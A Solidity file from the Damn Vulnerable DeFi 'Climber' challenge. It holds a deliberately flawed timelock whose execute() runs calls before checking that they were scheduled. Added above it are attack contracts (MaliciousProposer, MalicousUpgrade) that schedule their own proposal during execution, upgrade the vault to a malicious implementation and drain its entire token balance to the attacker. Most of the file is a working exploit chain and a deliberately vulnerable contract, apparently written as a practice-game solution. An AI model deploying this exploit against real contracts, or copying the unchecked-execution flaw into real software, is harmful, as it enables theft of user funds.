// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./ClimberTimelockBase.sol";
import "./ClimberVault.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";
import {InvalidTargetsCount, InvalidDataElementsCount, InvalidValuesCount, OperationAlreadyKnown, NotReadyForExecution, CallerNotTimelock, NewDelayAboveMax} from "./ClimberErrors.sol";
import "hardhat/console.sol";

contract MalicousUpgrade is ClimberVault {
    function drainFunds(address player, address token) external {
        SafeTransferLib.safeTransfer(
            token,
            player,
            IERC20(token).balanceOf(address(this))
        );
    }
}

contract MaliciousProposer {
    address player;
    ClimberTimelock timeLock;
    MalicousUpgrade targetVault;
    address maliciousClimberImplementation;
    address token;
    bytes proposerData;

    constructor(
        address _player,
        address payable _timeLock,
        address _targetVault,
        address _maliciousClimberImplementation,
        address _token
    ) {
        player = _player;
        timeLock = ClimberTimelock(_timeLock);
        targetVault = MalicousUpgrade(_targetVault);
        maliciousClimberImplementation = _maliciousClimberImplementation;
        token = _token;
    }

    function setProposerData(bytes memory _proposerData) public {
        proposerData = _proposerData;
    }

    function propose() public {
        // propose initial proposal getting rid of the delay and granting proposer role
        (bool success, ) = address(msg.sender).call(
            abi.encodePacked(ClimberTimelock.schedule.selector, proposerData)
        );
        require(success, "Malicious schedule of original data failed");

        // propose and execute malicious upgrade
        bytes memory upgradeData = abi.encodePacked(
            hex"3659cfe6",
            abi.encode(maliciousClimberImplementation)
        );
        address[] memory targets = new address[](1);
        targets[0] = address(targetVault);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory data = new bytes[](1);
        data[0] = upgradeData;
        timeLock.schedule(targets, values, data, 0);
        timeLock.execute(targets, values, data, 0);

        // steal funds
        targetVault.drainFunds(player, token);
    }
}
/**
 * @title ClimberTimelock
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberTimelock is ClimberTimelockBase {
    using Address for address;

    /**
     * @notice Initial setup for roles and timelock delay.
     * @param admin address of the account that will hold the ADMIN_ROLE role
     * @param proposer address of the account that will hold the PROPOSER_ROLE role
     */
    constructor(address admin, address proposer) {
        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
        _setupRole(ADMIN_ROLE, admin);
        _setupRole(ADMIN_ROLE, address(this)); // self administration
        _setupRole(PROPOSER_ROLE, proposer);

        delay = 1 hours;
    }

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external onlyRole(PROPOSER_ROLE) {
        if (targets.length == MIN_TARGETS || targets.length >= MAX_TARGETS) {
            revert InvalidTargetsCount();
        }

        if (targets.length != values.length) {
            revert InvalidValuesCount();
        }

        if (targets.length != dataElements.length) {
            revert InvalidDataElementsCount();
        }

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        if (getOperationState(id) != OperationState.Unknown) {
            revert OperationAlreadyKnown(id);
        }

        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
        operations[id].known = true;
    }

    /**
     * Anyone can execute what's been scheduled via `schedule`
     */
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
        if (targets.length <= MIN_TARGETS) {
            revert InvalidTargetsCount();
        }

        if (targets.length != values.length) {
            revert InvalidValuesCount();
        }

        if (targets.length != dataElements.length) {
            revert InvalidDataElementsCount();
        }

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length;) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
            unchecked {
                ++i;
            }
        }

        if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }

        operations[id].executed = true;
    }

    function updateDelay(uint64 newDelay) external {
        if (msg.sender != address(this)) {
            revert CallerNotTimelock();
        }

        if (newDelay > MAX_DELAY) {
            revert NewDelayAboveMax();
        }

        delay = newDelay;
    }
}
